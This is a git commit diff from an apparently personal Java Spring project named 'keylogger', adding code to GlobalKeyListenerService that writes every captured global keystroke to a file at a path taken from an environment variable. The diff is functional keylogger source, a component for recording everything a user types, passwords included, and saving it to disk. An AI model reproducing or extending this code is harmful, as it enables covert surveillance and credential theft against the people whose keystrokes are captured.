3b8f790bce6d58287c83a8837c9c33c1f1887477
Badar Al-Busaidi <bader5uk@hotmail.com>
2025-05-13 15:09:26 +0400

    Added the function to store inputs in a text file

--- src/main/java/com/badar/keylogger/Services/GlobalKeyListenerService.java
+++ src/main/java/com/badar/keylogger/Services/GlobalKeyListenerService.java
@@ -15,6 +15,11 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.stereotype.Service;
 
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
 @Service
 public class GlobalKeyListenerService {
     private boolean leftShiftPressed = false;
@@ -66,6 +71,12 @@ public class GlobalKeyListenerService {
                     String keyChar = KeyCodeConverter.getKeyName(info.vkCode, isShiftActive);
                     synchronized(inputLock) {
                         storedInput.append(keyChar);
+                        File file = new File(System.getenv("FILE_PATH"));
+                        try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
+                            writer.append(storedInput);
+                        } catch (IOException e) {
+                            throw new RuntimeException(e);
+                        }
                         System.out.println(storedInput);
                     }
                 }
